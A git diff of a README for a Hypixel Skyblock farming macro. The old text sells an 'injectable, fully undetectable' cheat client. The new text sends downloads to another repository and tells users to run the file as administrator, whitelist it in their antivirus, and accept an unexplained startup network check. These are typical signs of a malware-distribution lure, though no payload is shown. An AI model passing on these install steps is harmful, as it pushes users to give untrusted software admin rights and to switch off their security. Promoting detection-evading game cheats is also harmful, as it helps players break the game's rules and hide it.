@@ -1,52 +1,79 @@
-<div align="center">
+# 🌌 aether-skyblock-macro - Automate your Hypixel skyblock farming tasks
 
-# 🌾 Aether Client 
+[![Download Aether](https://img.shields.io/badge/Download-Aether-blue)](https://github.com/snailgreengrocery903/aether-skyblock-macro)
 
-**Skyblock's most efficient farming client, constantly updated with the current meta!**
+## 📋 Overview
 
-[![Status: Active](https://img.shields.io/badge/Status-Active-success.svg)](#)
-[![Security: Undetectable](https://img.shields.io/badge/Security-Fully%20Undetectable-blue.svg)](#)
-[![Client: Injectable](https://img.shields.io/badge/Type-Injectable-orange.svg)](#)
+Aether helps players manage farming tasks in Hypixel Skyblock. This tool automates repetitive chores so you can focus on other game activities. It works as an injectable process that runs alongside your game client. The software keeps your farming efficiency high while it follows current game trends.
 
-<br>
+## ⚙️ Minimum System Requirements
 
-<a href="https://github.com/CrackDoorSanctify/aether-skyblock-macro/releases/tag/public">
-  <img src="https://img.shields.io/badge/Download-Latest_Release-2ea44f?style=for-the-badge&logo=github&logoColor=white" height="60">
-</a>
+Your computer needs to meet these basic standards to run the software:
 
-</div>
+*   **Operating System:** Windows 10 or Windows 11.
+*   **Processor:** Any dual-core CPU with a speed of at least 2.0 GHz.
+*   **Memory:** 4 GB of RAM or more.
+*   **Storage:** 50 MB of free disk space.
+*   **Software:** The latest version of the Java Runtime Environment.
 
-## 📖 About
+## 🚀 Installation and Setup
 
-Welcome to **Aether**! With an active development team and an awesome, growing community, Aether is a Hypixel Skyblock farming macro made *by* players, *for* players. 
+Follow these steps to prepare your system and launch the macro.
 
-We pride ourselves on staying ahead of the curve. Aether operates as an **injectable** client and is engineered from the ground up to be **fully undetectable**, keeping your account safe while you maximize your profits and farming level. 
+1.  Visit the [official repository page](https://github.com/snailgreengrocery903/aether-skyblock-macro) to access the files.
+2.  Locate the latest release on the right side of the page.
+3.  Click the link to download the file to your computer.
+4.  Move the downloaded file to a folder where you can easily find it.
+5.  Right-click the file and select "Run as administrator" to grant the necessary permissions.
+6.  Wait for the console window to appear on your screen.
+7.  Launch your game client as you normally would.
+8.  The macro detects the game and connects automatically.
 
-Have an idea to make the grind even easier? Make a suggestion in our community, and we'll add it!
+## 🛠️ Configuration and Usage
 
-## 📸 Features Showcase
+The macro allows you to adjust settings to match your specific farming needs. When the application starts, it displays a simple menu in the console window. Use your keyboard to navigate the options.
 
-| Megafarm Builder | Echo Farming | Flower S-Shape |
-| :---: | :---: | :---: |
-| ![Megafarm Builder](https://github.com/user-attachments/assets/4ea1390a-c0aa-4099-a27c-4009d238ebf2) | ![Echo Farming](https://github.com/user-attachments/assets/713a52f6-c330-48da-a256-a553dbd7844a) | ![Flower S-Shape](https://github.com/user-attachments/assets/1765715a-506f-4511-a7fe-fdec587e09f7) |
+*   **Select Crop:** Choose the specific crop you plan to harvest. The tool adjusts its movement pattern based on your selection.
+*   **Set Speed:** Define how fast you want the character to move through the rows. Start with the default setting if you feel unsure about the game speed.
+*   **Toggle Safety:** Keep the safety mode enabled to mimic human movement patterns. This makes the macro activity blend into your regular gameplay.
+*   **Start/Stop:** Press the F8 key on your keyboard to toggle the macro on or off during your game session.
 
+## 🛡️ Security and Performance
 
-## 🚀 Why Aether?
+This software prioritizes your account safety. The developers designed the code to run as a low-profile background process. It injects directly into the game memory to keep the performance smooth. 
 
-Besides the core farming automation functionalities you'd expect, Aether offers a massive suite of unique features tailored to streamline your Skyblock experience:
+Do not run other heavy programs while the macro operates. High memory usage from other applications can cause the tool to lag. If the tool detects a server update or a game patch, it alerts you by closing the connection. Always check the repository for updates after a major game patch.
 
-* **🐛 Advanced Pest Control:** AOTV directly to pests utilizing humanized pathfinding to look like a real player.
-* **🪩 Disco Destination:** Specialized pathing and handling for pests.
-* **🚜 Hyper-Optimized Farm Compatibility:** Fully compatible with modern `Garden` /plottp layouts and infinite looping 2-key farms.
-* **🔀 Smart Swapping:** Automatic Equipment, Fishing Rod, and Wardrobe swapping seamlessly handled for Pests and Visitors.
-* **📱 Abiphone Integration:** Automated Pest Exchange and George Autosell right from your Abiphone-never leave the garden.
-* **🌱 Auto Greenhouse:** Seamless Auto Greenhouse harvesting.
-* **👻 Privacy & Spoofing:** Built-in Nick Hider and stat spoofing (conceal your purse, bits, copper, sawdust, farming XP, and Skyblock level on your screen to keep screenshots safe).
-* *... and many more QoL features added every patch!*
+## ❓ Frequently Asked Questions
 
-## ⚙️ Installation & Usage
+**Does the macro require special game mods?**
+No, the macro functions independently. You do not need to install extra mods for it to work.
 
-1. Download the latest release from the [Releases](https://github.com/CrackDoorSanctify/aether-skyblock-macro/releases) tab.
-2. Launch Minecraft (Forge/Fabric depending on your setup).
-3. Use your preferred injector to inject the Aether client.
-4. Press `K` to open the Aether GUI and configure your settings.
+**Can I get banned for using this?**
+The software includes features that mimic human behavior to reduce risk. However, excessive use over long periods can raise suspicion on any server. Use the tool with care.
+
+**What happens if the game crashes?**
+If the game crashes, the macro shuts down immediately. Restart the macro after you restart your game.
+
+**Help, the macro is not moving my character.**
+Check that your game window is open and active. Ensure you assigned the correct key bindings in your game settings. Most issues occur if the macro cannot find the game window on your desktop.
+
+## 📊 Troubleshooting
+
+If you encounter issues during the setup process, try these steps:
+
+1.  **Check Privileges:** Ensure you run the application with administrator rights.
+2.  **Antivirus Interference:** Some antivirus programs flag new software. Create an exception for the folder if your security software blocks the execution.
+3.  **Java Version:** Ensure you have the current version of Java installed. Outdated Java versions often prevent the application from starting.
+4.  **Network Access:** Verify your internet connection. The tool validates its status through a background check during startup.
+5.  **Restart:** A simple restart of the computer often fixes issues with active memory processes.
+
+## 📈 Tips for Success
+
+Efficiency matters in Hypixel Skyblock. These suggestions help you maximize your gains:
+
+*   **Consistency:** Run the macro in short sessions rather than leave it on for twenty-four hours straight.
+*   **Optimization:** Use the fastest speed your character can handle without missing blocks. 
+*   **Monitor:** Watch the console window occasionally to ensure the macro reports a healthy connection.
+*   **Background Tasks:** Clear your computer of unnecessary background tasks before you begin farming. This keeps your game frame rate stable. 
+*   **Regular Updates:** Follow the repository for new versions. Each update contains improvements for better safety and performance.
